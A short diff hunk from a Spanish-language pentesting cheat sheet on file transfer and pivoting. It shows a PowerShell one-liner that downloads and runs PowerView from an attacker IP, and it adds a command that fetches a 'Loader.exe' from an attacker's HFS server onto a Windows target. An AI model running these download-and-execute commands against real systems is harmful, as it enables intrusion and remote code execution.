@@ -19,6 +19,8 @@ Paso 3:
 Paso 4:
 ❯ iex (New-Object System.NET.WebClient).DownloadString('http://IP_Atacante/PowerView.ps1')
 # Descargar PowerView
+
+Invoke-WebRequest -Uri "http://<IP-de-tu-HFS>:8080/Loader.exe" -OutFile "C:\Users\Public\Loader.exe"
 ```
 
 ## Transferir hacia un segundo server utilizando el primer server como pivote 
